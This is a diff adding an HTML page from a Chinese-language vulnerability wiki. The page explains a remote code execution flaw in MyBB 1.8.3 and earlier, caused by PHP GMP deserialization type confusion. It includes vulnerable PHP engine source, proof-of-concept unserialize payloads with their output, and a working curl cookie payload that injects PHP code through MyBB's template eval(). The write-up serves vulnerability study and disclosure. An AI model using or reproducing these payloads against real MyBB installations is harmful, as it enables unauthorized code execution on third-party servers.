@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MyBB/MyBB%20_%3D%201.8.3%20rce%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>MyBB\&lt;=1.8.3 RCE - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "MyBB\\\u0026lt;=1.8.3 RCE", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../MyBB%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../MyBB%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        MyBB 后台代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Mura/Mura-CMS-processAsyncObject%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-32640%29/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Mura/Mura-CMS-processAsyncObject%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-32640%29/" class="btn btn-xs btn-link">
+        Mura CMS processAsyncObject存在SQL注入漏洞(CVE 2024 32640)
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="mybb183-rce">MyBB\&lt;=1.8.3 RCE<a class="headerlink" href="#mybb183-rce" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>在使用精心编制的对象的<code>__wakeup()</code>魔术方法进行GMP反序列化时发现了一个类型混淆漏洞，该漏洞可被滥用来更新分配给已创建对象的任何属性，进而触发严重的安全问题。</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>PHP 5.6 \&lt; 5.6.30</p>
+<p>MyBB\&lt;=1.8.3</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>gmp.c</p>
+<div class="codehilite"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">gmp_unserialize</span><span class="p">(</span><span class="n">zval</span><span class="w"> </span><span class="o">**</span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">zend_class_entry</span><span class="w"> </span><span class="o">*</span><span class="n">ce</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">unsigned</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">zend_uint</span><span class="w"> </span><span class="n">buf_len</span><span class="p">,</span><span class="w"> </span><span class="n">zend_unserialize_data</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="w"> </span><span class="n">TSRMLS_DC</span><span class="p">)</span><span class="w"> </span><span class="o">/*</span><span class="w"> </span><span class="p">{{{</span><span class="w"> </span><span class="o">*/</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="o">...</span>
+<span class="w">    </span><span class="n">ALLOC_INIT_ZVAL</span><span class="p">(</span><span class="n">zv_ptr</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">php_var_unserialize</span><span class="p">(</span><span class="o">&amp;</span><span class="n">zv_ptr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="nb">max</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">unserialize_data</span><span class="w"> </span><span class="n">TSRMLS_CC</span><span class="p">)</span>
+<span class="w">        </span><span class="o">||</span><span class="w"> </span><span class="n">Z_TYPE_P</span><span class="p">(</span><span class="n">zv_ptr</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">IS_ARRAY</span>
+<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">zend_throw_exception</span><span class="p">(</span><span class="n">NULL</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Could not unserialize properties&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">TSRMLS_CC</span><span class="p">);</span>
+<span class="w">        </span><span class="n">goto</span><span class="w"> </span><span class="n">exit</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">zend_hash_num_elements</span><span class="p">(</span><span class="n">Z_ARRVAL_P</span><span class="p">(</span><span class="n">zv_ptr</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">zend_hash_copy</span><span class="p">(</span>
+<span class="w">            </span><span class="n">zend_std_get_properties</span><span class="p">(</span><span class="o">*</span><span class="n">object</span><span class="w"> </span><span class="n">TSRMLS_CC</span><span class="p">),</span><span class="w"> </span><span class="n">Z_ARRVAL_P</span><span class="p">(</span><span class="n">zv_ptr</span><span class="p">),</span>
+<span class="w">            </span><span class="p">(</span><span class="n">copy_ctor_func_t</span><span class="p">)</span><span class="w"> </span><span class="n">zval_add_ref</span><span class="p">,</span><span class="w"> </span><span class="n">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">sizeof</span><span class="p">(</span><span class="n">zval</span><span class="w"> </span><span class="o">*</span><span class="p">)</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>zend_object_handlers.c</p>
+<div class="codehilite"><pre><span></span><code><span class="n">ZEND_API</span> <span class="n">HashTable</span> <span class="o">*</span><span class="n">zend_std_get_properties</span><span class="p">(</span><span class="n">zval</span> <span class="o">*</span><span class="n">object</span> <span class="n">TSRMLS_DC</span><span class="p">)</span> <span class="o">/*</span> <span class="p">{{{</span> <span class="o">*/</span>
+<span class="p">{</span>
+    <span class="n">zend_object</span> <span class="o">*</span><span class="n">zobj</span><span class="p">;</span>
+    <span class="n">zobj</span> <span class="o">=</span> <span class="n">Z_OBJ_P</span><span class="p">(</span><span class="n">object</span><span class="p">);</span>
+    <span class="n">if</span> <span class="p">(</span><span class="err">!</span><span class="n">zobj</span><span class="o">-&gt;</span><span class="n">properties</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">rebuild_object_properties</span><span class="p">(</span><span class="n">zobj</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">return</span> <span class="n">zobj</span><span class="o">-&gt;</span><span class="n">properties</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>攻击者可以将<code>**object</code>更改为整数类型或bool类型的ZVAL，然后攻击者将能够通过<code>Z_OBJ_P</code>访问存储在对象库中的任何对象。这意味着攻击者将能够通过<code>zend_hash_copy()</code>更新对象中的任何属性。从而引发了一系列安全问题。</p>
+<p>下面这段代码可以验证这个漏洞</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="k">class</span> <span class="nc">obj</span>
+<span class="p">{</span>
+    <span class="k">var</span> <span class="nv">$ryat</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ryat</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="k">stdClass</span><span class="p">;</span>
+<span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">aa</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">bb</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+
+<span class="nv">$inner</span> <span class="o">=</span> <span class="s1">&#39;s:1:&quot;1&quot;;a:3:{s:2:&quot;aa&quot;;s:2:&quot;hi&quot;;s:2:&quot;bb&quot;;s:2:&quot;hi&quot;;i:0;O:3:&quot;obj&quot;:1:{s:4:&quot;ryat&quot;;R:2;}}&#39;</span><span class="p">;</span>
+<span class="nv">$exploit</span> <span class="o">=</span> <span class="s1">&#39;a:1:{i:0;C:3:&quot;GMP&quot;:&#39;</span><span class="o">.</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$inner</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;:{&#39;</span><span class="o">.</span><span class="nv">$inner</span><span class="o">.</span><span class="s1">&#39;}}&#39;</span><span class="p">;</span>
+<span class="nv">$x</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$exploit</span><span class="p">);</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>预期结果:</p>
+<div class="codehilite"><pre><span></span><code>object(stdClass)#1 (2) {
+  [&quot;aa&quot;]=&gt;
+  int(1)
+  [&quot;bb&quot;]=&gt;
+  int(2)
+}
+</code></pre></div>
+
+<p>实际结果:</p>
+<div class="codehilite"><pre><span></span><code>object(stdClass)#1 (3) {
+  [&quot;aa&quot;]=&gt;
+  string(2) &quot;hi&quot;
+  [&quot;bb&quot;]=&gt;
+  string(2) &quot;hi&quot;
+  [0]=&gt;
+  object(obj)#3 (1) {
+    [&quot;ryat&quot;]=&gt;
+    &amp;int(1)
+  }
+}
+</code></pre></div>
+
+<h3 id="_5">漏洞利用<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>在<code>php 5.6&lt;=5.6.11</code>中，DateInterval的<code>__wakeup()</code>使用<code>convert_to_long()</code>句柄并重新分配其属性，因此攻击者可以通过GMP的<code>gmp_cast_object()</code>将GMP对象转换成任何整数类型的ZVAL:</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">static</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="nx">gmp_cast_object</span><span class="p">(</span><span class="nx">zval</span><span class="w"> </span><span class="o">*</span><span class="nx">readobj</span><span class="p">,</span><span class="w"> </span><span class="nx">zval</span><span class="w"> </span><span class="o">*</span><span class="nx">writeobj</span><span class="p">,</span><span class="w"> </span><span class="nx">int</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="nx">TSRMLS_DC</span><span class="p">)</span><span class="w"> </span><span class="cm">/* {{{ */</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="nx">mpz_ptr</span><span class="w"> </span><span class="nx">gmpnum</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">switch</span><span class="w"> </span><span class="p">(</span><span class="k">type</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="o">...</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="nx">IS_LONG</span><span class="p">:</span>
+<span class="w">        </span><span class="nx">gmpnum</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">GET_GMP_FROM_ZVAL</span><span class="p">(</span><span class="nx">readobj</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">INIT_PZVAL</span><span class="p">(</span><span class="nx">writeobj</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">ZVAL_LONG</span><span class="p">(</span><span class="nx">writeobj</span><span class="p">,</span><span class="w"> </span><span class="nx">mpz_get_si</span><span class="p">(</span><span class="nx">gmpnum</span><span class="p">));</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">SUCCESS</span><span class="p">;</span>
+</code></pre></div>
+
+<p>漏洞利用代码</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="s1">&#39;a:2:{i:0;C:3:&quot;GMP&quot;:17:{s:4:&quot;1234&quot;;a:0:{}}i:1;O:12:&quot;DateInterval&quot;:1:{s:1:&quot;y&quot;;R:2;}}&#39;</span><span class="p">));</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>当然，也可以套用精心编制的<code>__wakeup()</code></p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ryat</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ryat</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<h4 id="mybb-183">MyBB \&lt;= 1.8.3<a class="headerlink" href="#mybb-183" title="Permanent link">&para;</a></h4>
+<p>index.php</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">mybb</span><span class="o">-&gt;</span><span class="n">cookies</span><span class="p">[</span><span class="s">&#39;mybb&#39;</span><span class="p">][</span><span class="s">&#39;forumread&#39;</span><span class="p">]))</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="err">$</span><span class="n">forumsread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">my_unserialize</span><span class="p">(</span><span class="err">$</span><span class="n">mybb</span><span class="o">-&gt;</span><span class="n">cookies</span><span class="p">[</span><span class="s">&#39;mybb&#39;</span><span class="p">][</span><span class="s">&#39;forumread&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>MyBB\&lt;=1.8.3允许通过<code>unserialize()</code>反序列化cookie，因此攻击者能够更新<code>$mybb</code>或其他对象的属性，从而很容易导致安全问题，例如：XSS、SQL注入、RCE等
+好消息是该漏洞已经在新版本得到了修复</p>
+<h3 id="poc">PoC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<p>MyBB \&lt;= 1.8.3 RCE漏洞</p>
+<p>index.php</p>
+<div class="codehilite"><pre><span></span><code><span class="n">eval</span><span class="p">(</span><span class="s">&#39;$index = &quot;&#39;.$templates-&gt;get(&#39;</span><span class="nf">index</span><span class="s">&#39;).&#39;&quot;;&#39;</span><span class="p">);</span>
+</code></pre></div>
+
+<p>MyBB在模板解析过程中始终使用eval()函数。 inc/class_templates.php</p>
+<div class="codehilite"><pre><span></span><code><span class="k">class</span> <span class="n">templates</span>
+{
+    ...
+    <span class="n">public</span> <span class="nv">$cache</span> = <span class="n">array</span>();
+    ...
+    <span class="n">function</span> <span class="nb">get</span>(<span class="nv">$title</span>, <span class="nv">$eslashes</span>=<span class="mi">1</span>, <span class="nv">$htmlcomments</span>=<span class="mi">1</span>)
+    {
+        <span class="n">global</span> <span class="nv">$db</span>, <span class="nv">$theme</span>, <span class="nv">$mybb</span>;
+        ...
+        <span class="nv">$template</span> = <span class="nv">$this-</span>&gt;<span class="nb">cache</span>[<span class="nv">$title</span>];
+        ...
+        <span class="k">return</span> <span class="nv">$template</span>;
+    }
+</code></pre></div>
+
+<p>如果我们可以控制<code>$cache</code>，我们就可以通过<code>eval()</code>函数注入php代码。
+inc/init.php</p>
+<div class="codehilite"><pre><span></span><code><span class="err">$</span><span class="nx">error_handler</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">errorHandler</span><span class="p">();</span>
+<span class="o">...</span>
+<span class="err">$</span><span class="nx">maintimer</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">timer</span><span class="p">();</span>
+<span class="o">...</span>
+<span class="err">$</span><span class="nx">mybb</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">MyBB</span><span class="p">;</span>
+<span class="o">...</span>
+<span class="nx">switch</span><span class="p">(</span><span class="err">$</span><span class="nx">config</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">database</span><span class="err">&#39;</span><span class="p">][</span><span class="err">&#39;</span><span class="k">type</span><span class="err">&#39;</span><span class="p">])</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s">&quot;sqlite&quot;</span><span class="p">:</span>
+<span class="w">        </span><span class="err">$</span><span class="nx">db</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">DB_SQLite</span><span class="p">;</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s">&quot;pgsql&quot;</span><span class="p">:</span>
+<span class="w">        </span><span class="err">$</span><span class="nx">db</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">DB_PgSQL</span><span class="p">;</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="s">&quot;mysqli&quot;</span><span class="p">:</span>
+<span class="w">        </span><span class="err">$</span><span class="nx">db</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">DB_MySQLi</span><span class="p">;</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">    </span><span class="k">default</span><span class="p">:</span>
+<span class="w">        </span><span class="err">$</span><span class="nx">db</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">DB_MySQL</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="o">...</span>
+<span class="err">$</span><span class="nx">templates</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">templates</span><span class="p">;</span>
+</code></pre></div>
+
+<p><code>$templates</code>对象在<code>init.php</code>中实例化，并且在此之前实例化了四个对象。这意味着<code>$templates</code>对象的句柄被设置为5并存储到对象存储中，因此我们可以访问<code>$templates</code>对象并通过在GMP反序列化期间将GMP对象转换为整型ZVAL(其值为5)来更新<code>$cache</code>属性。这也表明我们可以通过eval()函数注入php代码。</p>
+<p>当MyBB\&lt;=1.8.3和PHP5.6\&lt;=5.6.11时，只需在命令行上使用curl即可触发RCE：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">curl</span><span class="w"> </span><span class="c1">--cookie &#39;mybb[forumread]=a:1:{i:0%3bC:3:&quot;GMP&quot;:106:{s:1:&quot;5&quot;%3ba:2:{s:5:&quot;cache&quot;%3ba:1:{s:5:&quot;index&quot;%3bs:14:&quot;{${phpinfo()}}&quot;%3b}i:0%3bO:12:&quot;DateInterval&quot;:1:{s:1:&quot;y&quot;%3bR:2%3b}}}}&#39; http://0-sec.org/mybb</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../MyBB%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../MyBB%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        MyBB 后台代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Mura/Mura-CMS-processAsyncObject%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-32640%29/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Mura/Mura-CMS-processAsyncObject%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-32640%29/" class="btn btn-xs btn-link">
+        Mura CMS processAsyncObject存在SQL注入漏洞(CVE 2024 32640)
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
